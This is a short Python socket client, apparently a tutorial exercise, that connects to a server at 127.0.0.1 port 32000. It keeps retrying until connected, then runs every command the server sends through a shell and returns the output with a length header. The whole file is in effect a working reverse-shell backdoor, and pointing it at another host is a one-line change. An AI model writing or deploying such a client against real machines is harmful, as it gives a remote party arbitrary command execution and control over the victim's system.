# ---------- Sockets network : Client ----------
import os
import platform
import socket
import time
import subprocess

HOST_IP = "127.0.0.1"
HOST_PORT = 32000
MAX_DATA_SIZE = 1024

print(f"Connection at server: {HOST_IP}, port: {HOST_PORT} ....")
while True:
    try:
        s = socket.socket()
        s.connect((HOST_IP, HOST_PORT))
    except ConnectionRefusedError:
        print(f"Error : Unable to connect to server. Reconnection...")
        time.sleep(4)
    else:
        print(f"Connected to server.")
        break

# if received_data:
#     print(received_data.decode())
# else:
#     print("No data")
while True:
    command_data = s.recv(MAX_DATA_SIZE)
    if not command_data:
        break
    command = command_data.decode()
    print(f"Command : ", command)

    if command == "infos":
        response = platform.platform() + " " + os.getcwd()
    else:
        result = subprocess.run(command, shell=True, capture_output=True, universal_newlines=True)
        response = result.stdout + result.stderr

        if not response or len(response) == 0:
            response = ""

    # HEADER 13 octets -> length octet
    # DATA (length) octets

    # HEADER 0000003173
    # DATA 3173 octets

    header = str(len(response.encode())).zfill(13)
    print(f"Header {header}")
    s.sendall(header.encode())
    s.sendall(response.encode())

    # Hanshake

s.close()